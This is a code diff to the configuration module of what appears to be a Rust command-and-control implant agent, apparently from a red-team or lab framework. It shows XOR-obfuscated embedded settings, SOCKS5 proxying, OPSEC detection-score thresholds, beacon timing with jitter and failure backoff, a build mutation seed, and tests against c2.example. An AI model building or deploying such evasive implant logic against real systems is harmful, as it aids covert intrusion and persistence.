@@ -1,12 +1,11 @@
 use crate::auth::SecretCredential;
+use crate::tasks::validate_identifier;
 use log::{error, info, warn};
 use obfstr::obfstr;
+use reqwest::header::HeaderValue;
 use reqwest::{redirect, Client, Proxy, Url};
 use serde::{Deserialize, Serialize};
-use std::env;
-use std::fs;
 use std::io;
-use std::path::Path;
 use std::time::Duration;
 
 const C2_CONNECT_TIMEOUT: Duration = Duration::from_secs(10);
@@ -81,6 +80,7 @@ pub fn same_origin(left: &Url, right: &Url) -> bool {
 }
 
 #[derive(Serialize, Deserialize, Clone, Debug)]
+#[serde(deny_unknown_fields)]
 pub struct AgentConfig {
     pub server_url: String,
     pub sleep_interval: u64,
@@ -93,6 +93,10 @@ pub struct AgentConfig {
     #[serde(default, skip_serializing)]
     pub enrollment_credential: SecretCredential,
     pub protocol: String,
+    /// Build-provenance metadata. Startup verifies that it matches the seed
+    /// compiled into the mutation module; it is not a runtime transport knob.
+    #[serde(default = "default_mutation_seed")]
+    pub mutation_seed: String,
     #[serde(default)]
     pub socks5_enabled: bool,
     #[serde(default = "default_socks5_host")]
@@ -133,6 +137,10 @@ pub struct AgentConfig {
 
 fn default_socks5_host() -> String {
     obfstr!("127.0.0.1").to_string()
+}
+
+fn default_mutation_seed() -> String {
+    env!("MUTATION_SEED_USED").to_string()
 }
 
 fn default_socks5_port() -> u16 {
@@ -177,32 +185,33 @@ fn default_reduced_activity_sleep_secs() -> u64 {
 }
 
 fn default_c2_failure_threshold_increase_factor() -> f32 {
-    1.0 // Default: No increase
+    1.1
 }
 
 fn default_c2_failure_threshold_decrease_factor() -> f32 {
-    1.0 // Default: No decrease
+    0.9
 }
 
 fn default_c2_threshold_adjust_interval_secs() -> u64 {
-    u64::MAX // Default: Effectively disable periodic adjustment
+    3600
 }
 
 fn default_c2_dynamic_threshold_max_multiplier() -> f32 {
-    1.0 // Default: Dynamic threshold cannot exceed base threshold
+    2.0
 }
 
 impl Default for AgentConfig {
     fn default() -> Self {
         Self {
             server_url: String::new(),
-            sleep_interval: 5,
+            sleep_interval: 60,
             jitter: 2,
             payload_id: String::new(),
             agent_id: String::new(),
             listener_id: String::new(),
             enrollment_credential: SecretCredential::default(),
             protocol: obfstr!("http").to_string(),
+            mutation_seed: default_mutation_seed(),
             socks5_enabled: false,
             socks5_host: obfstr!("127.0.0.1").to_string(),
             socks5_port: 9050,
@@ -228,44 +237,123 @@ impl Default for AgentConfig {
 // The AgentConfig struct is used to load and manage the agent's configuration.
 impl AgentConfig {
     pub fn load() -> io::Result<Self> {
-        // First try using the embedded config
-        match deobfuscate_config(EMBEDDED_CONFIG_HEX, EMBEDDED_CONFIG_XOR_KEY) {
-            Ok(deobfuscated_json) => {
-                if let Ok(config) = serde_json::from_str::<AgentConfig>(&deobfuscated_json) {
-                    if !config.server_url.is_empty() && !config.payload_id.is_empty() {
-                        return Ok(config);
-                    }
-                    warn!("[WARNING] Embedded config invalid after deobfuscation (missing server_url or payload_id)");
-                } else {
-                    warn!("[WARNING] Failed to parse deobfuscated embedded config");
-                }
-            }
-            Err(e) => {
-                warn!("[WARNING] Failed to deobfuscate embedded config: {}", e);
-            }
+        let deobfuscated_json = deobfuscate_config(EMBEDDED_CONFIG_HEX, EMBEDDED_CONFIG_XOR_KEY)
+            .map_err(|err| {
+                io::Error::new(
+                    io::ErrorKind::InvalidData,
+                    format!("embedded agent config could not be decoded: {err}"),
+                )
+            })?;
+        let config = serde_json::from_str::<AgentConfig>(&deobfuscated_json).map_err(|err| {
+            io::Error::new(
+                io::ErrorKind::InvalidData,
+                format!("embedded agent config is invalid JSON: {err}"),
+            )
+        })?;
+        config.validate().map_err(|err| {
+            io::Error::new(
+                io::ErrorKind::InvalidInput,
+                format!("embedded agent config is invalid: {err}"),
+            )
+        })?;
+        Ok(config)
+    }
+
+    pub fn validate(&self) -> Result<(), String> {
+        let url = self.get_validated_server_url()?;
+        if url.scheme() != self.protocol {
+            return Err("protocol does not match server_url".to_string());
+        }
+        if !matches!(url.path(), "" | "/") {
+            return Err("server_url must not include a path".to_string());
+        }
+        validate_identifier("payload_id", &self.payload_id).map_err(|err| err.to_string())?;
+        validate_identifier("listener_id", &self.listener_id).map_err(|err| err.to_string())?;
+        if !self.agent_id.is_empty() {
+            validate_identifier("agent_id", &self.agent_id).map_err(|err| err.to_string())?;
+        }
+        SecretCredential::new_bootstrap(self.enrollment_credential.expose().to_string())
+            .map_err(|err| format!("enrollment_credential {err}"))?;
+
+        if self.sleep_interval == 0 {
+            return Err("sleep_interval must be at least one second".to_string());
+        }
+        self.sleep_interval
+            .checked_add(self.jitter)
+            .ok_or_else(|| "sleep_interval plus jitter exceeds the supported range".to_string())?;
+        if self.socks5_port == 0 {
+            return Err("socks5_port must be between 1 and 65535".to_string());
+        }
+        self.socks5_proxy_url()?;
+        self.user_agent
+            .parse::<HeaderValue>()
+            .map_err(|_| "user_agent is not a valid HTTP header value".to_string())?;
+        if self.user_agent.is_empty() {
+            return Err("user_agent must not be empty".to_string());
+        }
+        self.proc_scan_interval_secs
+            .checked_add(60)
+            .ok_or_else(|| "proc_scan_interval_secs exceeds the supported range".to_string())?;
+        if !self.base_score_threshold_bg_to_reduced.is_finite()
+            || !self.base_score_threshold_reduced_to_full.is_finite()
+            || self.base_score_threshold_bg_to_reduced < 0.0
+            || self.base_score_threshold_bg_to_reduced > 100.0
+            || self.base_score_threshold_reduced_to_full < 0.0
+            || self.base_score_threshold_reduced_to_full > 100.0
+        {
+            return Err(
+                "OPSEC score thresholds must each be finite and within 0..=100".to_string(),
+            );
+        }
+        if self.base_score_threshold_bg_to_reduced >= self.base_score_threshold_reduced_to_full {
+            return Err(
+                "base_score_threshold_bg_to_reduced must be lower than base_score_threshold_reduced_to_full"
+                    .to_string(),
+            );
+        }
+        if !self.c2_failure_threshold_increase_factor.is_finite()
+            || self.c2_failure_threshold_increase_factor < 0.0
+            || (self.c2_failure_threshold_increase_factor != 0.0
+                && self.c2_failure_threshold_increase_factor < 1.0)
+        {
+            return Err(
+                "c2_failure_threshold_increase_factor must be zero or a finite value of at least one"
+                    .to_string(),
+            );
+        }
+        if !self.c2_failure_threshold_decrease_factor.is_finite()
+            || self.c2_failure_threshold_decrease_factor < 0.0
+            || self.c2_failure_threshold_decrease_factor > 1.0
+        {
+            return Err(
+                "c2_failure_threshold_decrease_factor must be finite and within 0..=1".to_string(),
+            );
+        }
+        if !self.c2_dynamic_threshold_max_multiplier.is_finite()
+            || self.c2_dynamic_threshold_max_multiplier < 0.0
+            || (self.c2_dynamic_threshold_max_multiplier != 0.0
+                && self.c2_dynamic_threshold_max_multiplier < 1.0)
+        {
+            return Err(
+                "c2_dynamic_threshold_max_multiplier must be zero or a finite value of at least one"
+                    .to_string(),
+            );
         }
 
-        // Try filesystem config as fallback
-        if let Ok(exe_path) = env::current_exe() {
-            let exe_dir = exe_path.parent().unwrap_or(Path::new("."));
-            let config_path = exe_dir.join(".config").join("config.json");
-
-            if config_path.exists() {
-                if let Ok(contents) = fs::read_to_string(&config_path) {
-                    if let Ok(config) = serde_json::from_str::<AgentConfig>(&contents) {
-                        if !config.server_url.is_empty() && !config.payload_id.is_empty() {
-                            return Ok(config);
-                        }
-                    }
-                }
-            }
+        let seed = self
+            .mutation_seed
+            .strip_prefix("0x")
+            .unwrap_or(&self.mutation_seed);
+        let parsed_seed = u64::from_str_radix(seed, 16)
+            .map_err(|_| "mutation_seed must be a hexadecimal u64".to_string())?;
+        let canonical_seed = format!("{parsed_seed:016x}");
+        if self.mutation_seed != canonical_seed {
+            return Err("mutation_seed must be 16 lowercase hexadecimal characters".to_string());
         }
-
-        // No valid config found
-        Err(io::Error::new(
-            io::ErrorKind::NotFound,
-            "No valid configuration found",
-        ))
+        if self.mutation_seed != env!("MUTATION_SEED_USED") {
+            return Err("mutation_seed does not match the compiled mutation seed".to_string());
+        }
+        Ok(())
     }
 
     pub fn get_server_url(&self) -> String {
@@ -296,6 +384,33 @@ impl AgentConfig {
         Ok(url)
     }
 
+    fn socks5_proxy_url(&self) -> Result<String, String> {
+        if self.socks5_host.is_empty() || self.socks5_host != self.socks5_host.trim() {
+            return Err("socks5_host must be a non-empty hostname or IP address".to_string());
+        }
+        let authority_host = if self.socks5_host.starts_with('[') && self.socks5_host.ends_with(']')
+        {
+            self.socks5_host.clone()
+        } else if self.socks5_host.contains(':') {
+            format!("[{}]", self.socks5_host)
+        } else {
+            self.socks5_host.clone()
+        };
+        let proxy_url = format!("socks5h://{authority_host}:{}", self.socks5_port);
+        let parsed = Url::parse(&proxy_url)
+            .map_err(|_| "socks5_host is not a valid hostname or IP address".to_string())?;
+        if parsed.host_str().is_none()
+            || !parsed.username().is_empty()
+            || parsed.password().is_some()
+            || parsed.query().is_some()
+            || parsed.fragment().is_some()
+            || !matches!(parsed.path(), "" | "/")
+        {
+            return Err("socks5_host is not a valid hostname or IP address".to_string());
+        }
+        Ok(proxy_url)
+    }
+
     /// Build an HTTP client that respects the SOCKS5 proxy config and logs the proxy status.
     pub fn build_http_client(&self) -> Result<Client, io::Error> {
         if self.allow_invalid_certs && !self.allow_insecure_isolated_lab {
@@ -319,7 +434,9 @@ impl AgentConfig {
         }
 
         if self.socks5_enabled {
-            let proxy_url = format!("socks5h://{}:{}", self.socks5_host, self.socks5_port);
+            let proxy_url = self
+                .socks5_proxy_url()
+                .map_err(|err| io::Error::new(io::ErrorKind::InvalidInput, err))?;
             info!(
                 "[HTTP] Building HTTP client with SOCKS5 proxy: {}",
                 proxy_url
@@ -533,6 +650,83 @@ mod tests {
         let config: AgentConfig = serde_json::from_str(&decoded).expect("valid config JSON");
         assert_eq!(config.server_url, "https://c2.example:8443");
         assert_eq!(config.payload_id, "payload-one");
+    }
+
+    #[test]
+    fn agent_config_rejects_unknown_or_retired_fields() {
+        let json = format!(
+            r#"{{
+                "server_url":"https://c2.example:8443",
+                "sleep_interval":60,
+                "jitter":2,
+                "payload_id":"payload-one",
+                "listener_id":"listener-one",
+                "protocol":"https",
+                "mutation_seed":"{}",
+                "mutation_endpoint_segments":["retired"]
+            }}"#,
+            env!("MUTATION_SEED_USED")
+        );
+        let error = serde_json::from_str::<AgentConfig>(&json)
+            .expect_err("unknown runtime config fields must be rejected");
+        assert!(error.to_string().contains("mutation_endpoint_segments"));
+    }
+
+    #[test]
+    fn validates_complete_runtime_configuration_before_startup() {
+        const BOOTSTRAP: &str = "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkI";
+        let valid = AgentConfig {
+            server_url: "https://c2.example:8443".to_string(),
+            payload_id: "payload-one".to_string(),
+            listener_id: "listener-one".to_string(),
+            enrollment_credential: SecretCredential::new_bootstrap(BOOTSTRAP)
+                .expect("test bootstrap"),
+            protocol: "https".to_string(),
+            ..Default::default()
+        };
+        valid.validate().expect("complete config should validate");
+
+        let mut contradictory_protocol = valid.clone();
+        contradictory_protocol.protocol = "http".to_string();
+        assert!(contradictory_protocol.validate().is_err());
+
+        let mut zero_valued_controls = valid.clone();
+        zero_valued_controls.proc_scan_interval_secs = 0;
+        zero_valued_controls.base_score_threshold_bg_to_reduced = 0.0;
+        zero_valued_controls.base_score_threshold_reduced_to_full = 1.0;
+        zero_valued_controls.reduced_activity_sleep_secs = 0;
+        zero_valued_controls.base_max_consecutive_c2_failures = 0;
+        zero_valued_controls.c2_failure_threshold_increase_factor = 0.0;
+        zero_valued_controls.c2_failure_threshold_decrease_factor = 0.0;
+        zero_valued_controls.c2_threshold_adjust_interval_secs = 0;
+        zero_valued_controls.c2_dynamic_threshold_max_multiplier = 0.0;
+        zero_valued_controls
+            .validate()
+            .expect("zero-valued controls must remain valid in a consistent profile");
+
+        let mut unreachable_reduced_activity = valid.clone();
+        unreachable_reduced_activity.base_score_threshold_bg_to_reduced = 60.0;
+        unreachable_reduced_activity.base_score_threshold_reduced_to_full = 60.0;
+        assert!(unreachable_reduced_activity.validate().is_err());
+
+        let mut wrong_seed = valid;
+        wrong_seed.mutation_seed = "0123456789abcdef".to_string();
+        if wrong_seed.mutation_seed != env!("MUTATION_SEED_USED") {
+            assert!(wrong_seed.validate().is_err());
+        }
+    }
+
+    #[test]
+    fn socks5_proxy_url_brackets_ipv6_literals() {
+        let config = AgentConfig {
+            socks5_host: "::1".to_string(),
+            socks5_port: 9050,
+            ..Default::default()
+        };
+        assert_eq!(
+            config.socks5_proxy_url().expect("IPv6 proxy URL"),
+            "socks5h://[::1]:9050"
+        );
     }
 
     #[test]
